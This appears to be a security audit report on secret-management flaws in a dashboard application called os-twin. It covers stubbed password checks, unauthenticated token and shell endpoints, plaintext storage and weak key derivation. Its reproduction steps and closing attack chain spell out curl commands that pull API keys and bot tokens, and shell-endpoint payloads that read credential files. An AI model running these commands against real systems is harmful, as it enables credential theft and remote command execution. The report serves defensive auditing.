# Variant Analysis: Cryptographic and Secret Management Weaknesses
**Phase**: 10
**Date**: 2026-03-30
**Analyst**: Variant Hunter (Phase 10)
**Scope**: Full repository — /Users/bytedance/Desktop/demo/os-twin
**Origin Findings**:
- `.agents/mcp/vault.py:117` — hardcoded encryption key (p8-020)
- `.agents/mcp/vault.py:15-16` — silent crypto downgrade to plaintext (p8-021)
- `dashboard/routes/auth.py:43-44` — API key leaked in response body (p8-024)
- `dashboard/routes/auth.py:48-55` — cookie missing secure flag (p8-028)

---

## Search Strategy Summary

The following detection signatures were searched across all Python files and configuration files:

| Signature | Method |
|---|---|
| Hardcoded keys / passwords / tokens | Grep: `secret\|password\|token\|api.?key` across `**/*.py` |
| base64 as "encryption" | Grep: `base64\|b64encode\|b64decode` |
| Missing `secure=True` on cookies | Grep: `set_cookie` across all Python files |
| Secrets returned in API responses | Manual review of all JSON response bodies |
| `except ImportError` disabling security | Grep: `except ImportError` in vault/crypto paths |
| Weak / stubbed key derivation | Grep: `verify_password\|get_password_hash\|create_access_token` |
| Debug/backdoor auth bypass | Grep: `DEBUG\|skip auth\|bypass` |
| Unauthenticated secret endpoints | Manual review of all route decorators without `Depends(get_current_user)` |
| Plaintext secret storage | Review of `telegram_bot.py` config file path |

---

## Confirmed Variants

---

### VARIANT-001: Stubbed Password Verification Always Returns True

**Phase**: 10
**Sequence**: 001
**Slug**: stubbed-verify-password-always-true
**Verdict**: VALID
**Rationale**: `verify_password()` is a no-op stub that unconditionally returns `True`, meaning any plaintext/hashed password comparison will always succeed if this function is ever called in the auth flow.
**Severity-Original**: MEDIUM
**PoC-Status**: pending
**Origin-Finding**: security/findings-draft/p8-020-vault-hardcoded-key.md (crypto stub pattern)
**Origin-Pattern**: Weak / disabled cryptographic primitive

#### Summary

`dashboard/auth.py:29-30` defines `verify_password(plain_password, hashed_password)` as a stub that always returns `True`. `get_password_hash()` (line 33-34) always returns the static string `"disabled"`. `create_access_token()` (line 37-38) always returns `"disabled"`. These three functions are exported as part of the `dashboard.auth` module API surface. Any code path that calls `verify_password()` — now or in future feature additions — will bypass password verification entirely without error or log output.

#### Location

- `dashboard/auth.py:29-30` — `verify_password` stub returns `True` unconditionally
- `dashboard/auth.py:33-34` — `get_password_hash` returns static string `"disabled"`
- `dashboard/auth.py:37-38` — `create_access_token` returns static string `"disabled"`

#### Attacker Control

Any future code path that invokes `verify_password(attacker_input, stored_hash)` will return `True` regardless of input. The vulnerability is latent — it is a primed time-bomb in the auth module. Currently the main auth flow uses `secrets.compare_digest` directly (bypassing these stubs), so exploitation requires either: (a) a developer adding a username/password flow that calls the stub, or (b) a third-party integration that imports and uses these functions.

#### Trust Boundary Crossed

Application logic boundary. The function signature implies cryptographic password verification; the implementation removes the verification silently.

#### Impact

- Silent auth bypass for any code path using these stubs
- No indication of failure — `True` is a legitimate return value
- `get_password_hash("anypassword")` returns `"disabled"` — all hashes are identical
- Violates security contract established by the function signatures

#### Evidence

```python
# dashboard/auth.py:29-38
def verify_password(plain_password: str, hashed_password: str) -> bool:
    return True                    # Always passes — no bcrypt/argon2 check

def get_password_hash(password: str) -> str:
    return "disabled"              # Identical hash for all passwords

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    return "disabled"              # All tokens are identical
```

#### Reproduction Steps

1. Import the auth module: `from dashboard.auth import verify_password`
2. Call with mismatched credentials: `verify_password("wrong_password", "stored_hash")`
3. Observe return value is `True` — verification succeeded despite mismatch
4. Call `get_password_hash("secret123")` and `get_password_hash("other")` — both return `"disabled"`

---

### VARIANT-002: Unauthenticated GET /api/telegram/config Returns Bot Token Plaintext

**Phase**: 10
**Sequence**: 002
**Slug**: unauth-telegram-config-secret-leak
**Verdict**: VALID
**Rationale**: The Telegram bot token — a long-lived credential — is returned unauthenticated over the network to any caller, enabling full bot impersonation; structurally identical to the API-key-in-response-body pattern of p8-024 but without even requiring a prior successful auth step.
**Severity-Original**: HIGH
**PoC-Status**: executed (confirmed in p8-022 cold verification)
**Origin-Finding**: security/findings-draft/p8-024-api-key-in-login-response.md (secret in response body pattern)
**Origin-Pattern**: Secret returned in API response body; missing authentication guard

#### Summary

`GET /api/telegram/config` at `dashboard/routes/system.py:148-150` returns `{"bot_token": "<token>", "chat_id": "<id>"}` with no `Depends(get_current_user)` guard. Seven other endpoints in the same file require authentication. The response body contains the live Telegram bot token in plaintext. The dashboard binds to `0.0.0.0:9000` with `allow_origins=["*"]` CORS, so this is reachable from any network or cross-origin browser context. The token is a permanent credential — there is no rotation mechanism.

#### Location

- `dashboard/routes/system.py:148-150` — endpoint definition, no auth dependency
- `dashboard/telegram_bot.py:16-24` — `get_config()` returns raw token from JSON file
- `dashboard/telegram_bot.py:14` — `CONFIG_FILE = Path(__file__).parent / "telegram_config.json"` — stored adjacent to source code
- `dashboard/api.py:108-113` — CORS wildcard `allow_origins=["*"]`

#### Attacker Control

Zero input required. Single unauthenticated HTTP GET request returns the credential.

```
GET /api/telegram/config HTTP/1.1
Host: <target>:9000
```

Response:
```json
{"bot_token": "123456789:AABBCCDDEEFFaabbccddeeff...", "chat_id": "..."}
```

#### Trust Boundary Crossed

Network boundary — unauthenticated remote → permanent Telegram credential. Additionally, the bot token is stored in `telegram_config.json` co-located with source code in the `dashboard/` directory, crossing the secrets-should-not-be-in-source boundary.

#### Impact

- Full Telegram bot impersonation (send messages, read updates, poll message history)
- Social engineering: send phishing messages from the trusted bot identity
- Notification interception: all OS Twin system notifications are read
- Accessible from any cross-origin web page (CORS wildcard)
- No auth, no rate limit, no logging of access

#### Evidence

```python
# dashboard/routes/system.py:148-150
@router.get("/telegram/config")
async def get_telegram_config():          # No Depends(get_current_user)
    return telegram_bot.get_config()      # Returns {"bot_token": "...", "chat_id": "..."}

# Compare — authenticated endpoint immediately above:
# @router.get("/config")
# async def get_config(user: dict = Depends(get_current_user)):  <-- auth present
```

```python
# dashboard/telegram_bot.py:16-24
def get_config():
    if not CONFIG_FILE.exists():
        return {"bot_token": "", "chat_id": ""}
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)           # Returns raw token, no redaction
```

#### Reproduction Steps

1. Configure a Telegram bot token: `POST /api/telegram/config` with `{"bot_token": "TOKEN", "chat_id": "ID"}`
2. Without authentication: `curl http://<host>:9000/api/telegram/config`
3. Observe full token in response
4. Verify bot access: `curl https://api.telegram.org/bot<token>/getMe`

---

### VARIANT-003: GET /api/env Returns All Secret Values in Plaintext (Including AI Provider API Keys)

**Phase**: 10
**Sequence**: 003
**Slug**: env-endpoint-secrets-in-response
**Verdict**: VALID
**Rationale**: The `/api/env` endpoint returns the full raw contents of `~/.ostwin/.env` including every secret value (ANTHROPIC_API_KEY, OPENAI_API_KEY, GOOGLE_API_KEY) in plaintext JSON; structurally identical to the API-key-in-response-body pattern but for a broader set of credentials.
**Severity-Original**: HIGH
**PoC-Status**: pending
**Origin-Finding**: security/findings-draft/p8-024-api-key-in-login-response.md
**Origin-Pattern**: Secrets returned in API response body

#### Summary

`GET /api/env` at `dashboard/routes/system.py:244-251` reads `~/.ostwin/.env`, parses it, and returns both the structured `entries` list (containing every key-value pair including secret values) and the full `raw` text of the file. This includes `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, and any other secrets the user has stored. While the endpoint requires authentication (`Depends(get_current_user)`), once an attacker authenticates (via the leaked `access_token` from p8-024, or via the DEBUG bypass from p8-003), they receive all stored secrets in a single response. The `raw` field returns the file verbatim — no redaction of any kind.

Additionally, `POST /api/env` (line 254-270) allows overwriting the entire `.env` file. An authenticated attacker can inject new environment variables, modify existing secrets, or corrupt the configuration.

#### Location

- `dashboard/routes/system.py:244-251` — `GET /api/env` returns `{"raw": "<full .env contents>", "entries": [...]}`
- `dashboard/routes/system.py:254-270` — `POST /api/env` overwrites the entire `.env` file
- `dashboard/routes/system.py:28-50` — `_parse_env()` does not redact any values

#### Attacker Control

Requires authentication. Preconditions significantly lowered by:
1. p8-024 (API key returned in login response — key can be extracted from network logs or DevTools)
2. p8-003 (DEBUG bypass — if `OSTWIN_API_KEY=DEBUG`, no auth needed)
3. p8-005 (env newline injection — can set `OSTWIN_API_KEY=DEBUG` via the save endpoint)

Once authenticated, a single GET retrieves all secrets.

#### Trust Boundary Crossed

Authentication boundary (weakened by companion findings) → full secret store exfiltration. Also: application-to-filesystem boundary — the API provides direct read/write access to the raw secrets file.

#### Impact

- All AI provider API keys (Anthropic, OpenAI, Google) exposed in one request
- `OSTWIN_API_KEY` itself exposed (enables persistent re-authentication)
- `POST /api/env` allows secret manipulation (injecting malicious values, deleting legitimate keys)
- No redaction — values returned verbatim including leading/trailing whitespace that might indicate key format

#### Evidence

```python
# dashboard/routes/system.py:244-251
@router.get("/env")
async def get_env(user: dict = Depends(get_current_user)):
    if not _ENV_FILE.exists():
        return {"path": str(_ENV_FILE), "entries": [], "raw": ""}
    raw = _ENV_FILE.read_text()           # Full file including all secret values
    entries = _parse_env(raw)
    return {"path": str(_ENV_FILE), "entries": entries, "raw": raw}  # raw = plaintext secrets
```

Example response body after authentication:
```json
{
  "path": "/Users/<user>/.ostwin/.env",
  "entries": [
    {"type": "var", "key": "ANTHROPIC_API_KEY", "value": "sk-ant-...", "enabled": true},
    {"type": "var", "key": "OPENAI_API_KEY", "value": "sk-...", "enabled": true},
    {"type": "var", "key": "GOOGLE_API_KEY", "value": "AIza...", "enabled": true}
  ],
  "raw": "ANTHROPIC_API_KEY=sk-ant-...\nOPENAI_API_KEY=sk-...\nGOOGLE_API_KEY=AIza...\n"
}
```

#### Reproduction Steps

1. Start dashboard with valid `OSTWIN_API_KEY`
2. Authenticate: `curl -X POST http://localhost:9000/api/auth/token -d '{"key":"<key>"}'`
3. Capture `access_token` from response (per p8-024 — it is the raw API key)
4. Retrieve all secrets: `curl -H "X-API-Key: <key>" http://localhost:9000/api/env`
5. Observe all `.env` secret values returned verbatim in `raw` and `entries`

---

### VARIANT-004: Telegram Bot Token Stored as Plaintext JSON Adjacent to Source Code

**Phase**: 10
**Sequence**: 004
**Slug**: telegram-token-plaintext-file-storage
**Verdict**: VALID
**Rationale**: The Telegram bot token is stored in a plaintext JSON file co-located with application source code rather than in the vault or OS keychain, bypassing all secret management protections and making it accessible to any process or user that can read the directory.
**Severity-Original**: MEDIUM
**PoC-Status**: pending
**Origin-Finding**: security/findings-draft/p8-020-vault-hardcoded-key.md
**Origin-Pattern**: Secret stored without cryptographic protection

#### Summary

`dashboard/telegram_bot.py:14` sets `CONFIG_FILE = Path(__file__).parent / "telegram_config.json"`. This resolves to `dashboard/telegram_config.json` — a plaintext JSON file stored inside the application source directory. The Telegram bot token (a permanent credential) is written to this file by `save_config()` (line 26-33) with no encryption, no file permission hardening, and no use of the existing `EncryptedFileVault` or OS Keychain. The `vault.py` module exists specifically to handle secrets of this type but is not used here. The file is world-readable under default umask.

This is structurally identical to the p8-020 vault hardcoded-key finding: a secret is stored without protection when a protection mechanism already exists in the same codebase.

#### Location

- `dashboard/telegram_bot.py:14` — `CONFIG_FILE = Path(__file__).parent / "telegram_config.json"`
- `dashboard/telegram_bot.py:26-33` — `save_config()` writes raw token to JSON with no encryption
- `dashboard/telegram_bot.py:16-24` — `get_config()` reads and returns raw token
- `.agents/mcp/vault.py:168-173` — existing vault infrastructure not used

#### Attacker Control

Any OS user or process with read access to the `dashboard/` directory can read the file directly. No crypto, no permission check, no vault lookup required.

```bash
cat /path/to/os-twin/dashboard/telegram_config.json
# {"bot_token": "123456789:AABBCCDDEEFFaabbccddeeff...", "chat_id": "..."}
```

#### Trust Boundary Crossed

Filesystem boundary. Any local user or process reading the source directory obtains the Telegram credential. Also exposed via version control if the file is accidentally committed.

#### Impact

- Telegram bot credential permanently exposed on disk in plaintext
- Risk of accidental git commit (no `.gitignore` entry specifically protecting `telegram_config.json`)
- Accessible to any process running as the same OS user (web server, build tools, linters)
- Combined with VARIANT-002: two independent paths to the same credential (HTTP API and direct file read)

#### Evidence

```python
# dashboard/telegram_bot.py:14, 26-33
CONFIG_FILE = Path(__file__).parent / "telegram_config.json"  # Plaintext, no vault

def save_config(bot_token: str, chat_id: str):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump({"bot_token": bot_token, "chat_id": chat_id}, f)  # No encryption
        return True
```

Contrast with the vault's protected storage:
```python
# .agents/mcp/vault.py:147-152 — used for MCP secrets but NOT for Telegram
def set(self, server: str, key: str, value: str):
    data = self._load_data()
    data[server][key] = value
    self._save_data(data)   # Fernet-encrypted or OS Keychain
```

#### Reproduction Steps

1. Configure Telegram: `curl -X POST http://localhost:9000/api/telegram/config -d '{"bot_token":"TOKEN","chat_id":"ID"}'`
2. Read the file directly: `cat dashboard/telegram_config.json`
3. Observe plaintext JSON with full bot token
4. Alternatively: `ls -la dashboard/telegram_config.json` — confirm world-readable permissions

---

### VARIANT-005: `EncryptedFileVault` Key Derivation Truncates and Left-Pads User Key (Weak KDF)

**Phase**: 10
**Sequence**: 005
**Slug**: vault-weak-key-derivation-truncation
**Verdict**: VALID
**Rationale**: When `OSTWIN_VAULT_KEY` is provided, the vault silently truncates it to 32 bytes using `ljust(32)[:32]` with zero padding, converting arbitrary-strength passphrases into weak, partially-known keys without any proper KDF (PBKDF2/scrypt/argon2), reducing effective key entropy.
**Severity-Original**: MEDIUM
**PoC-Status**: pending
**Origin-Finding**: security/findings-draft/p8-020-vault-hardcoded-key.md
**Origin-Pattern**: Weak key derivation — no PBKDF2/scrypt/argon2

#### Summary

`EncryptedFileVault._get_encryption_key()` at `.agents/mcp/vault.py:107-113` converts the user-supplied `OSTWIN_VAULT_KEY` into a Fernet key by: (1) encoding it to UTF-8, (2) left-justifying to 32 bytes (padding short keys with null bytes `\x00`), (3) truncating at 32 bytes, (4) base64-encoding the result. This is not a key derivation function. It does not use a salt, iterations, or a memory-hard algorithm.

Consequences:
- If `OSTWIN_VAULT_KEY` is shorter than 32 bytes, it is right-padded with `\x00` — the padding pattern is known and reduces brute-force search space
- If it is exactly 32 bytes, the encoding is trivially reversible (no stretching)
- Keys longer than 32 bytes are silently truncated — users with 64-char random keys get 32-char keys without warning
- No salt means identical passphrases always produce identical Fernet keys (no protection against precomputed tables)

The module imports `PBKDF2HMAC` (line 13) but never uses it in the key derivation path.

#### Location

- `.agents/mcp/vault.py:107-113` — `_get_encryption_key()` — weak derivation path
- `.agents/mcp/vault.py:13` — `PBKDF2HMAC` imported but unused
- `.agents/mcp/vault.py:117` — fallback hardcoded key (separate p8-020 finding)

#### Attacker Control

An attacker who can observe (or guess) the vault file can brute-force the user-supplied key without any cost amplification because there is no KDF stretching or salt. Short keys (< 32 bytes) leak their length via the null-padding pattern in the derived key.

#### Trust Boundary Crossed

Cryptographic boundary. A user who sets a strong passphrase receives weaker-than-intended key material silently.

#### Impact

- Keys shorter than 32 bytes padded with known null bytes — brute-force is easier than expected
- Keys longer than 32 bytes silently truncated — user believes they have stronger key than deployed
- No salt — rainbow table / precomputed dictionary attacks applicable
- `PBKDF2HMAC` is imported but dead code — missed opportunity for correct implementation

#### Evidence

```python
# .agents/mcp/vault.py:107-113
def _get_encryption_key(self) -> bytes:
    env_key = os.environ.get("OSTWIN_VAULT_KEY")
    if env_key:
        try:
            # Fernet key must be 32 bytes and base64 encoded
            return base64.urlsafe_b64encode(env_key.encode().ljust(32)[:32])
            #                                              ^^^^^^^^^^^^^^^^^
            #                              No salt, no iterations, no KDF — just truncate/pad
        except Exception:
            pass
    # ... hardcoded fallback
```

Correct implementation using the already-imported `PBKDF2HMAC`:
```python
# This code exists in the imports but is NEVER called:
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
```

#### Reproduction Steps

1. Set `OSTWIN_VAULT_KEY=short` (5 chars)
2. Observe derived key = `base64(b"short\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")`
3. The padding pattern (`\x00` * 27) is known — brute-force only needs to search 5-char keyspace
4. Set `OSTWIN_VAULT_KEY=` + 64-char random string — silently only first 32 chars used

---

### VARIANT-006: Unauthenticated POST /api/shell Executes Arbitrary OS Commands

**Phase**: 10
**Sequence**: 006
**Slug**: unauth-shell-no-auth-guard
**Verdict**: VALID
**Rationale**: `POST /api/shell` executes the user-supplied `command` string with `shell=True` and no authentication guard — any network client can run arbitrary OS commands; this crosses the secret management boundary by enabling direct access to all secrets on the filesystem.
**Severity-Original**: CRITICAL
**PoC-Status**: pending
**Origin-Finding**: security/findings-draft/p8-001-unauth-rce-shell.md
**Origin-Pattern**: Unauthenticated remote code execution; secret exfiltration via command execution

#### Summary

`POST /api/shell` at `dashboard/routes/system.py:166-169` accepts a `command` query/body parameter and executes it via `subprocess.run(command, shell=True, ...)` with no `Depends(get_current_user)` guard. This is relevant to the secret management threat model because an attacker who can run arbitrary shell commands can: (1) read `~/.ostwin/.env` directly, (2) read `dashboard/telegram_config.json`, (3) decrypt the vault using the hardcoded key (per p8-020), and (4) exfiltrate all credentials. All secret management protections are bypassed by arbitrary command execution.

#### Location

- `dashboard/routes/system.py:166-169` — `shell_command()` with no auth, `shell=True`

#### Attacker Control

Full. Any string passed as `command` is executed by the shell.

```
POST /api/shell?command=cat+~/.ostwin/.env HTTP/1.1
Host: <target>:9000
```

#### Trust Boundary Crossed

Network boundary → OS command execution → complete filesystem and secret access. No authentication at any layer.

#### Impact

- Arbitrary OS command execution as the dashboard process user
- Direct read of all secrets: `.env`, `telegram_config.json`, vault file
- Can install persistence (cron, ssh keys, etc.)
- Amplifies all secret management weaknesses: hardcoded vault key, plaintext telegram token, and env secrets are all directly readable
- Dashboard binds to `0.0.0.0:9000` — network-accessible

#### Evidence

```python
# dashboard/routes/system.py:166-169
@router.post("/shell")
async def shell_command(command: str):           # No Depends(get_current_user)
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
```

#### Reproduction Steps

1. Start the dashboard (no auth setup needed)
2. `curl -X POST "http://localhost:9000/api/shell?command=cat+%7E%2F.ostwin%2F.env"`
3. Observe response contains all secrets from the env file
4. `curl -X POST "http://localhost:9000/api/shell?command=cat+dashboard%2Ftelegram_config.json"`
5. Observe Telegram bot token in plaintext

---

## Non-Variant Findings (Reviewed and Excluded)

The following patterns were investigated but excluded from the variant list:

| Pattern | Location | Reason Excluded |
|---|---|---|
| `DISCORD_TOKEN=your_discord_bot_token_here` in `discord-bot/.env.example` | `discord-bot/.env.example:1` | Placeholder value, not a real secret. `.env.example` files are documentation by convention. |
| `TEST_API_KEY = "test_key_123"` | `dashboard/tests/test_skills_api_v4.py:10` | Test file only; value is explicitly a test fixture, not used in production. |
| `os.environ["OSTWIN_API_KEY"] = "test-key"` | `dashboard/tests/conftest.py:19`, `test_roles_api_v1.py:9` | Test harness setup; scoped to test execution only. |
| `get_config()` returning empty strings when file missing | `dashboard/telegram_bot.py:17-18` | Correct defensive behavior for unconfigured state. |
| `verify_api.py` referencing `bot_token` | `dashboard/verify_api.py:25,28` | Test verification script using mock values. |
| CORS `allow_origins=["*"]` | `dashboard/api.py` | Relevant amplifier but not a standalone crypto/secret variant; covered as context in VARIANT-002/006. |

---

## Summary Table

| ID | Slug | File | Lines | Severity | Pattern |
|---|---|---|---|---|---|
| VARIANT-001 | stubbed-verify-password-always-true | `dashboard/auth.py` | 29-38 | MEDIUM | Stubbed crypto — always returns True |
| VARIANT-002 | unauth-telegram-config-secret-leak | `dashboard/routes/system.py` | 148-150 | HIGH | Secret in unauthenticated API response |
| VARIANT-003 | env-endpoint-secrets-in-response | `dashboard/routes/system.py` | 244-251 | HIGH | All secrets returned in authenticated response (no redaction) |
| VARIANT-004 | telegram-token-plaintext-file-storage | `dashboard/telegram_bot.py` | 14, 26-33 | MEDIUM | Secret stored plaintext — vault bypass |
| VARIANT-005 | vault-weak-key-derivation-truncation | `.agents/mcp/vault.py` | 107-113 | MEDIUM | Weak KDF — truncation/padding, no salt |
| VARIANT-006 | unauth-shell-no-auth-guard | `dashboard/routes/system.py` | 166-169 | CRITICAL | Unauthenticated RCE enabling full secret exfiltration |

**Total confirmed variants: 6**

---

## Attack Chain Note

Several variants chain together for maximum impact:

**Full secret exfiltration chain (unauthenticated)**:
1. VARIANT-006: `POST /api/shell` (no auth) → `cat ~/.ostwin/.env` → obtains `OSTWIN_API_KEY`
2. VARIANT-003: `GET /api/env` (now authenticated) → obtains all AI provider API keys
3. VARIANT-002: `GET /api/telegram/config` (no auth needed) → obtains Telegram bot token
4. p8-020 + VARIANT-005: Read `~/.ostwin/mcp/.vault.enc` via shell → decrypt with hardcoded key → obtains all MCP service credentials

**Total exposure**: All secrets managed by the application are reachable in a single attack session requiring no prior knowledge of credentials.

